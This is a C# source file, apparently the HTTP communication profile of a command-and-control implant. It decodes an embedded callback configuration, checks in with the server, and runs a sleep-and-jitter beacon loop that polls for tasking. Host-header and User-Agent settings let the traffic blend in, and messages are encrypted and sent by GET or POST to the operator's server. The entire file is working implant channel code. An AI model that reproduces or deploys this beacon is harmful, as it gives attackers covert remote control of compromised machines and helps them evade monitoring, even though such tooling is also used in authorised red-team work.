using Agent.Interfaces;
using Agent.Models;
using System.Net;
using Agent.Utilities;

using System.Text.Json;

namespace Agent.Profiles
{
    public class HttpProfile : IProfile
    {
        public IAgentConfig agentConfig { get; set; }
        public ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private string userAgent { get; set; }
        private string hostHeader { get; set; }
        private string getURL { get; set; }
        private string postURL { get; set; }
        private string proxyHost { get; set; }
        private string proxyPass { get; set; }
        private string proxyUser { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private HttpClient _client { get; set; }

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;

        public HttpProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                HttpChannelOptionsJsonContext.Default.HttpChannelOptions)
                ?? throw new InvalidOperationException("Invalid HTTP profile configuration");

            string baseUrl = $"{opts.CallbackHost.TrimEnd('/')}:{opts.CallbackPort}";
            this.userAgent = opts.Headers.GetValueOrDefault("User-Agent", "");
            this.hostHeader = opts.Headers.GetValueOrDefault("Host", "");
            this.getURL = $"{baseUrl}/{opts.GetUri}?{opts.QueryPathName}=";
            this.postURL = $"{baseUrl}/{opts.PostUri}";
            this.proxyHost = string.IsNullOrEmpty(opts.ProxyPort)
                ? opts.ProxyHost
                : $"{opts.ProxyHost}:{opts.ProxyPort}";
            this.proxyPass = opts.ProxyPass;
            this.proxyUser = opts.ProxyUser;

            var handler = new HttpClientHandler();
            ConfigureProxy(handler);
            this._client = new HttpClient(handler);
            ConfigureRequestHeaders(opts.Headers);
        }

        private void ConfigureProxy(HttpClientHandler handler)
        {
            if (string.IsNullOrEmpty(this.proxyHost) || this.proxyHost == ":")
            {
                return;
            }

            handler.Proxy = new WebProxy { Address = new Uri(this.proxyHost) };
            if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
            {
                handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
            }
        }

        private void ConfigureRequestHeaders(Dictionary<string, string> headers)
        {
            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this._client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this._client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            foreach (var header in headers.Where(h => h.Key != "User-Agent" && h.Key != "Host"))
            {
                this._client.DefaultRequestHeaders.Add(header.Key, header.Value);
            }
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            const int maxCheckinAttempts = 3;
            for (int attempt = 0; attempt <= maxCheckinAttempts; attempt++)
            {
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
                if (TryParseCheckinResponse(res, out CheckinResponse? response))
                {
                    return response!;
                }
            }

            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
                }
                catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                {
                    break;
                }
                try
                {
                    bool delivered = await DeliverBeaconOnce();
                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                }
                catch (Exception)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        private async Task<bool> DeliverBeaconOnce()
        {
            GetTaskingResponse? tasking = null;
            await messageManager.DeliverAsync(
                this.Send,
                response => TryParseTasking(response, out tasking));
            if (tasking is null)
            {
                return false;
            }

            this.SetTaskingReceived?.Invoke(null, new TaskingReceivedArgs(tasking));
            return true;
        }

        private static bool TryParseCheckinResponse(string response, out CheckinResponse? checkinResponse)
        {
            checkinResponse = null;
            if (string.IsNullOrEmpty(response))
            {
                return false;
            }

            try
            {
                CheckinResponse? parsed = JsonSerializer.Deserialize(response, CheckinResponseJsonContext.Default.CheckinResponse);
                if (!CheckinResponseValidation.IsSuccessful(parsed))
                {
                    return false;
                }
                checkinResponse = parsed;
                return true;
            }
            catch (JsonException)
            {
                return false;
            }
        }

        private static bool TryParseTasking(string response, out GetTaskingResponse? tasking)
        {
            tasking = null;
            if (string.IsNullOrEmpty(response))
            {
                return false;
            }

            try
            {
                tasking = JsonSerializer.Deserialize(response, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (tasking?.action != "get_tasking")
                {
                    tasking = null;
                    return false;
                }
                return true;
            }
            catch (JsonException)
            {
                return false;
            }
        }

        internal async Task<string> Send(string json)
        {
            //This will encrypted if AES is selected or just Base64 encode if None is referenced.
            json = this.crypt.Encrypt(json);

            HttpResponseMessage response;
            if (json.Length < 2000) //Max URL length
            {
                // If there are trailing "==" (Base64 padding) at the end of the string, URL-encode them as "%3D%3D"
                if (json.EndsWith("=="))
                {
                    json = json[..^2] + "%3D%3D";
                }
                response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
            }
            else
            {
                response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
            }

            response.EnsureSuccessStatusCode();
            string strRes = await response.Content.ReadAsStringAsync();

            //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
            return this.crypt.Decrypt(strRes);
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();

            return true;
        }
    }
}
